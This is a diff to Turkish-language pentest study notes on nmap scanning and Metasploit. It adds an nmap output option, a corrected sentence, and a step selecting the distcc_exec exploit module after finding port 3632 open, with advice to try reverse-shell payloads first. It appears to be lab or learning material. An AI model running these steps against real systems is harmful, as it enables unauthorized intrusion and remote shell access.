@@ -162,6 +162,8 @@ meterpreter > help //yapabileceklerin çıkar
 
 - -p- tüm portlar
 
+- -oN sonuc.txt // bulduğu sonucu kaydeder
+
 **_Script Çalıştırmak _**
 
 - nmap.org sitesinden scriptleri bulup çalıştırılabilir.
@@ -175,11 +177,13 @@ meterpreter > help //yapabileceklerin çıkar
 
 ~nmap 10.0.2.12 -A -p- -T5 //ne var ne yok çıkarır
 
-- nmap sonuclarında bilinmeyen bir port alıp.. 3632 distccd v1 cp
+- nmap sonuclarında bilinmeyen bir port alınırsa.. 3632 distccd v1 cp
 
 ~msfconsole
 msf6> ~search mysql // ilgili tüm modüller listelenir. ordan cp yapıp sonra show options vs... devam et
 msf6> ~search distccd
+
+msf6> ~ use exploit(unix/misc/distcc_exec) //bu kısım search sonrası seçilir
 
 msf6> exploit(unix/misc/distcc_exec)~ show payloads //komutu, seçili exploit ile uyumlu payload’ları listeler.Exploit için gerekli payload’lar.Reverse olanlar hedef makinenin sana geri bağlantı kurduğu payload’lardır.İlk bunları dene
 
